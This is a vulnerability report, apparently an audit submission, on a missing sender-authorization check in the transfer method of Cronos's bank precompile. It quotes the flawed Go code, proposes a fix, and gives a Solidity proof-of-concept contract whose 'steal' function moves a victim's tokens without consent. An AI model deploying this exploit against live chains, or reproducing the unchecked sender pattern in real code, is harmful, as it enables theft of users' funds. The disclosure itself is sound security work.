### Title
Unauthorized Transfer of Native Bank Tokens via Missing Caller Authorization in Bank Precompile `transfer` Method - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `transfer` method of the `BankContract` precompile accepts an arbitrary `sender` address from caller-controlled input without verifying that the calling EVM contract is authorized to spend from that address. Any EVM contract can invoke `transfer(victim, attacker, amount)` to drain `evm/<contract_address>` native bank tokens from any holder's balance.

### Finding Description

The bank precompile at address `0x64` exposes a `transfer` method that moves `evm/<contract.Caller()>`-denominated native Cosmos bank tokens between two addresses:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)   // ← arbitrary, caller-controlled
    recipient := args[1].(common.Address)
    amount := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())
    to := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())  // evm/<calling_contract>
    amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
    err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
        ...
        if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

The `sender` field is taken directly from ABI-decoded input (`args[0]`). There is no check that `contract.Caller() == sender`, nor any allowance/approval mechanism. The only guard present is `checkBlockedAddr` on the recipient, which is unrelated to spend authorization. [2](#0-1) 

By contrast, the `mint` and `burn` methods correctly derive the acting party from `contract.Caller()` and operate on an explicitly passed `recipient`/`addr`, never allowing an arbitrary third-party address to be the source of funds. [3](#0-2) 

### Impact Explanation

**Critical** — Unauthorized transfer of precompile-controlled assets.

An attacker deploys a malicious EVM contract at address `0xATK`. The contract:
1. Calls `mint(victim, N)` on the bank precompile → mints `N` units of `evm/0xATK` to `victim` (e.g., as part of a DeFi protocol distributing rewards or collateral).
2. Later calls `transfer(victim, attacker_eoa, N)` on the bank precompile → the precompile executes `bankKeeper.SendCoins(victim → attacker_eoa, evm/0xATK)` with no authorization check.

The victim's `evm/0xATK` native bank balance is drained without consent. Because `evm/<contract_address>` tokens are precompile-controlled assets, this falls squarely within the Critical impact category: *unauthorized transfer of precompile-controlled assets*.

### Likelihood Explanation

**High** — The entry path is a standard EVM call to a deployed precompile. Any unprivileged EVM contract can reach this code path. No special permissions, leaked keys, or governance actions are required. The only precondition is that the victim holds a non-zero balance of the attacker contract's denom, which the attacker can arrange by minting tokens to the victim first.

### Recommendation

Add a caller-authorization guard at the top of the `TransferMethodName` case. The simplest correct fix is to require that `sender == contract.Caller()`, mirroring how `mint`/`burn` implicitly scope operations to the calling contract:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    if sender != contract.Caller() {
        return nil, errors.New("transfer: sender must be the calling contract")
    }
    ...
```

Alternatively, implement an ERC-20-style allowance mechanism if delegated transfers are intentionally desired.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function mint(address recipient, uint256 amount) external returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
}

contract AttackerContract {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64));

    // Step 1: mint evm/<this> tokens to victim (e.g., as "rewards")
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
    }

    // Step 2: steal them back — no approval from victim required
    function steal(address victim, address attacker, uint256 amount) external {
        // sender = victim (arbitrary, not checked against msg.sender or contract.caller)
        BANK.transfer(victim, attacker, amount);
    }
}
```

`steal()` succeeds because `bank.go`'s `transfer` case passes `from = sdk.AccAddress(sender.Bytes())` directly to `bankKeeper.SendCoins` without verifying that `sender == contract.Caller()`. [4](#0-3)
